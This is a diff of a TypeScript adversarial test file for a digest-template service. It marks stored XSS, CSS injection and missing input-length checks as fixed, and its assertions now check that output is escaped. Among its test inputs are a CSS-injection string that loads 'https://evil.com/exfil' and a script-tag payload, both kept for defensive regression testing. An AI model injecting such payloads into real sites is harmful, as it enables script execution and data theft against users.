@@ -1,9 +1,9 @@
 /**
  * ADVERSARIAL TESTS: Digest Templates
  *
- * SEC-053: Stored XSS via headerHtml/footerHtml — raw HTML injected into preview
- * SEC-054: CSS injection via unvalidated accentColor
- * SEC-055: No @MaxLength or @ArrayMaxSize on multiple DTO fields
+ * SEC-053: Stored XSS via headerHtml/footerHtml — FIXED (escaped in preview)
+ * SEC-054: CSS injection via unvalidated accentColor — FIXED (hex validation + sanitized in render)
+ * SEC-055: No @MaxLength or @ArrayMaxSize on DTO fields — FIXED
  */
 
 import { describe, it, expect, vi } from 'vitest';
@@ -28,8 +28,8 @@ function buildMockPrisma() {
   };
 }
 
-describe('[SEC-053] stored XSS in digest template preview', () => {
-  it('headerHtml is rendered unescaped in renderPreview output', async () => {
+describe('[SEC-053] stored XSS in digest template preview — FIXED', () => {
+  it('headerHtml is escaped in renderPreview output', async () => {
     const prisma = buildMockPrisma();
     const module = await Test.createTestingModule({
       providers: [
@@ -55,12 +55,11 @@ describe('[SEC-053] stored XSS in digest template preview', () => {
 
     const html = await service.renderPreview('t1');
 
-    // SEC-053: The script tag appears raw in the HTML — not escaped
-    expect(html).toContain(xssPayload);
-    // logoUrl IS escaped via escapeHtml(), but headerHtml is not
+    expect(html).not.toContain(xssPayload);
+    expect(html).toContain('&lt;script&gt;');
   });
 
-  it('footerHtml is also rendered unescaped', async () => {
+  it('footerHtml is escaped in renderPreview output', async () => {
     const prisma = buildMockPrisma();
     const module = await Test.createTestingModule({
       providers: [
@@ -85,12 +84,13 @@ describe('[SEC-053] stored XSS in digest template preview', () => {
     });
 
     const html = await service.renderPreview('t1');
-    expect(html).toContain(xssPayload);
+    expect(html).not.toContain(xssPayload);
+    expect(html).toContain('&lt;img');
   });
 });
 
-describe('[SEC-054] CSS injection via accentColor', () => {
-  it('accentColor is interpolated directly into style attributes', async () => {
+describe('[SEC-054] CSS injection via accentColor — FIXED', () => {
+  it('invalid accentColor is sanitized to default in renderPreview', async () => {
     const prisma = buildMockPrisma();
     const module = await Test.createTestingModule({
       providers: [
@@ -100,7 +100,6 @@ describe('[SEC-054] CSS injection via accentColor', () => {
     }).compile();
     const service = module.get<DigestTemplateService>(DigestTemplateService);
 
-    // CSS injection: break out of color property into a new property
     const cssInjection = '#000; } body { background-image: url(https://evil.com/exfil)';
 
     prisma.digestTemplate.findUnique.mockResolvedValue({
@@ -117,14 +116,13 @@ describe('[SEC-054] CSS injection via accentColor', () => {
 
     const html = await service.renderPreview('t1');
 
-    // SEC-054: The injected CSS appears in multiple style attributes
-    expect(html).toContain(`color: ${cssInjection}`);
-    expect(html).toContain(`background: ${cssInjection}`);
+    expect(html).not.toContain(cssInjection);
+    expect(html).toContain('#c5a880');
   });
 });
 
-describe('[SEC-055] missing DTO constraints', () => {
-  it('headerHtml has no @MaxLength — accepts megabyte payloads', async () => {
+describe('[SEC-055] DTO constraints — FIXED', () => {
+  it('headerHtml rejects megabyte payloads (@MaxLength)', async () => {
     const dto = plainToInstance(CreateDigestTemplateDto, {
       name: 'Test',
       subject: 'Subject',
@@ -132,10 +130,10 @@ describe('[SEC-055] missing DTO constraints', () => {
     });
 
     const errors = await validate(dto);
-    expect(errors.filter((e) => e.property === 'headerHtml')).toHaveLength(0);
+    expect(errors.filter((e) => e.property === 'headerHtml').length).toBeGreaterThan(0);
   });
 
-  it('sections has no @ArrayMaxSize — accepts thousands of items', async () => {
+  it('sections rejects thousands of items (@ArrayMaxSize)', async () => {
     const dto = plainToInstance(CreateDigestTemplateDto, {
       name: 'Test',
       subject: 'Subject',
@@ -143,14 +141,25 @@ describe('[SEC-055] missing DTO constraints', () => {
     });
 
     const errors = await validate(dto);
-    expect(errors.filter((e) => e.property === 'sections')).toHaveLength(0);
+    expect(errors.filter((e) => e.property === 'sections').length).toBeGreaterThan(0);
   });
 
-  it('accentColor has no format validation — accepts any string', async () => {
+  it('accentColor rejects non-hex strings (@Matches)', async () => {
     const dto = plainToInstance(CreateDigestTemplateDto, {
       name: 'Test',
       subject: 'Subject',
       accentColor: '<script>alert(1)</script>',
+    });
+
+    const errors = await validate(dto);
+    expect(errors.filter((e) => e.property === 'accentColor').length).toBeGreaterThan(0);
+  });
+
+  it('accentColor accepts valid hex color', async () => {
+    const dto = plainToInstance(CreateDigestTemplateDto, {
+      name: 'Test',
+      subject: 'Subject',
+      accentColor: '#c5a880',
     });
 
     const errors = await validate(dto);
